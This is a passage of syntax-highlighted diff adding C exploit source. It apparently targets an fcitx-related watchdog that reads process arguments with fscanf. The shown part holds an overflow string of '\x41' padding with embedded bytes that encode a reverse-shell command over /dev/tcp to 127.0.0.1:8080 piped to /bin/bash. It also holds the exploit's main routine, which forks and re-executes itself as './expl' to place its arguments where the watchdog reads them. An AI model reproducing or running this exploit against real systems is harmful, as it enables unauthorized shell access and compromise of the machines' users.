x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x65\x63\x68\x6f\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x21\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x21\x22\x2f\x62\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x25\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x69\x6e\x2f\x73\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x29\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x68\x21\x3e\x26\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x2d\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x21\x2f\x64\x65\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x31\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x76\x2f\x74\x63\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x35\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x70\x2f\x31\x32\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x39\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x37\x2e\x30\x2e\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x3d\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x30\x2e\x31\x2f\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x41\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x38\x30\x38\x30\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x45\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x21\x30\x3e\x26\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x49\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x31\x22\x21\x7c\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x4d\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x21\x2f\x62\x69\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x51\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x6e\x2f\x62\x61\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x55\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd5\x8e\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x73\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x41\x41\x41\x41\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x59\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x62\xe1\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x01</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x12\x79\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x25\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd6\x2d\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x01</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x12\x79\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x2e\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd6\x2d\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x01</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x12\x79\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x31\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd6\x2d\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x01</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x12\x79\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x49\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd6\x2d\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x01</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x12\x79\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x4f\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd6\x2d\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xa0\x8f\x41</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x01</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x12\x79\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x51\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\xd6\x2d\x46</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x12\x79\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x21\xf6\x68</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"</span><span class="se">\x80\x6d\x40</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">rerun</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">fcitx_pid</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">execl</span><span class="p">(</span><span class="s">"./expl"</span><span class="p">,</span> <span class="s">"./expl"</span><span class="p">,</span> <span class="n">fcitx_pid</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s">"./expl"</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"name of the exploit must be expl</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"first argument is the lowest pid of process with name containing fcitx</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"press any key to stop</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">getchar</span><span class="p">();</span>
+        <span class="c1">//block to let watchdog to fscanf this process' arguments
+</span>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span><span class="c1">//run directly
+</span>        <span class="n">pid_t</span> <span class="n">fcitx_pid</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">pid_t</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"pid: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
+        <span class="c1">//sleep(2); without sleep, the ps -ef and /proc cannot see the process
+</span>        <span class="c1">//optimization purpose?
+</span>        <span class="c1">//bug or feature?
+</span>        <span class="c1">//todo
+</span>        <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">&gt;</span> <span class="n">fcitx_pid</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">pid_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="p">{</span><span class="c1">//child
+</span>                <span class="n">rerun</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+            <span class="p">}</span>
+            <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="p">{</span><span class="c1">//parent
+</span>                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">else</span>
+            <span class="p">{</span>
